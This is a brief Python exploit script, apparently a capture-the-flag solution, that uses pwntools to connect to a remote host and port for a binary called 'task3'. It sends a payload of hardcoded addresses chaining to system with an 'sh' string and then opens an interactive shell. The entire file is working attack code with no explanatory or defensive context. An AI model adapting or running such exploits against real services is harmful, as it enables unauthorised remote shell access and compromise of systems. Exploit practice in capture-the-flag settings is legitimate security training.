#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *

# SETTINGS

BINARY = "task3"

IP = "92.53.104.174"
PORT = 37005

LINK_LIBC = False
LIBC = ""
LD = ""
GDBSCRIPT = """
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

# SPLOIT #

vuln =      p64(0x401245)
list_tmp =  p64(0x401280)
ls =        p64(0x40201f)
sh =        p64(0x404050)
_system =   p64(0x401090)
system =    p64(0x4040A0)

r.send(ls * 3 + list_tmp + system + sh)

r.interactive()
